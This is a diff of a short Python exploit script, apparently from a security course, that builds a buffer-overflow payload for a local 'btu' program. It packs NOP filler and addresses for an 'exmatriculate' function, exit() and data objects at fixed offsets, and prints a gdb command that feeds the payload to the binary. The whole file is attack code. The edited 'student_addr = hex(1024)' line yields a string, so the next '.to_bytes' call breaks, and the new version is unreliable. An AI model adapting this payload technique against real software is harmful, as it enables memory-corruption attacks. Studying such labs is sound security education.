@@ -9,24 +9,27 @@ import sys
 
 # Fill content with non-zero values 
 content = bytearray(0x90 for i in range(70)) 
-student_addr = 0x08057d50   # address of student
 
-content[66:70] = (student_addr).to_bytes(4, byteorder='little') 
+system_addr = 0x0804b0bb # The address of exmatriculate 
 
-
-btu_obj = 0x08050de0
-content[62:66] = (btu_obj).to_bytes(4, byteorder='little') 
+content[54:58] = (system_addr).to_bytes(4, byteorder='little' )
 
 
 exit_addr = 0xf7db1460 # The address of exit () 
 
 content[58:62] = (exit_addr).to_bytes(4, byteorder='little' ) 
 
-system_addr = 0x0804b0bb # The address of exmatriculate 
+btu_obj = 0x08050de0 # address of btu object. 
+content[62:66] = (btu_obj).to_bytes(4, byteorder='little') 
 
-content[54:58] = (system_addr).to_bytes(4, byteorder='little' ) 
+student_addr = hex(1024)   # hex value of student
+
+content[66:70] = (student_addr).to_bytes(4, byteorder='little') 
+
+
 
 
 # Print the final payload in escaped format for gdb --args
 escaped = ''.join('\\x{:02x}'.format(b) for b in content)
-print(f'"{escaped}"')
+
+print(f'gdb --args ./build/bin/btu remove 1024 $(echo -e "{escaped}")')
